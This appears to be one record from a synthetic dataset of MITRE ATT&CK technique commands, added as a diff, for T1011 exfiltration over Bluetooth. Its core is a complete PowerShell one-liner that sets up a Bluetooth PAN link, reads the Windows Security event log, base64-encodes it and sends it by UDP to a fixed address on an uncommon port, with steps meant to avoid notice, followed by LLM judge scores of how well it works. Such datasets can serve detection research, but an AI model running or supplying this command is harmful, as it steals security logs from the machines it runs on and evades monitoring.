@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.25.83.6 255.255.255.252 | Out-Null; $payload=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\System32\\winevt\\Logs\\Security.evtx')); $udp=New-Object Net.Sockets.UdpClient; $udp.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.25.83.6'),0)); $bytes=[Text.Encoding]::UTF8.GetBytes($payload); $udp.Send($bytes,$bytes.Length,'172.25.83.5',53127) | Out-Null; $udp.Close()",
+  "explanation": "Creates a Bluetooth PAN path and exfiltrates base64-encoded event log data via UDP to a nonstandard port over the Bluetooth interface (T1011).",
+  "rationale_steps": [
+    "Connect to Bluetooth NAP to establish the alternate medium.",
+    "Configure the Bluetooth IP using netsh, avoiding common interfaces.",
+    "Bind a UDP socket to the Bluetooth IP to ensure the medium is Bluetooth.",
+    "Send base64 data to a high-numbered, uncommon UDP port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-577a0b06",
+  "source_prompt_hash": "f4a0ca3c",
+  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell one-liner is well-formed with balanced quotes/parentheses, valid separators, and correct use of .NET and cmdlets.",
+        "semantic_score": 3,
+        "semantic_justification": "It automates packaging and attempted exfiltration over a Bluetooth PAN via UDP, but is operationally weak due to likely need for admin to change IP settings, limited read access to Security.evtx, questionable PAN establishment via BluetoothCL, and sending an oversized base64 payload in a single UDP datagram.",
+        "combined_score": 4.0,
+        "confidence": 0.78,
+        "timestamp": "2025-10-01T03:29:15.728795Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax for variable assignments, method calls, and piping operations.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements automated exfiltration by establishing a Bluetooth PAN connection, configuring the network interface, reading the Security event log file, encoding it as base64, and exfiltrating it via UDP to a specific IP and port.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:29:18.464391Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct PowerShell syntax for cmdlets, external executable calls, .NET methods, variable assignments, and command separators.",
+        "semantic_score": 2,
+        "semantic_justification": "The command cannot achieve its claimed intent with 'Privilege: None', as both `netsh interface ip set address` and reading `C:\\Windows\\System32\\winevt\\Logs\\Security.evtx` typically require Administrator privileges.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:45:09.097082Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.333,
+    "llm_average_score": 4.167,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
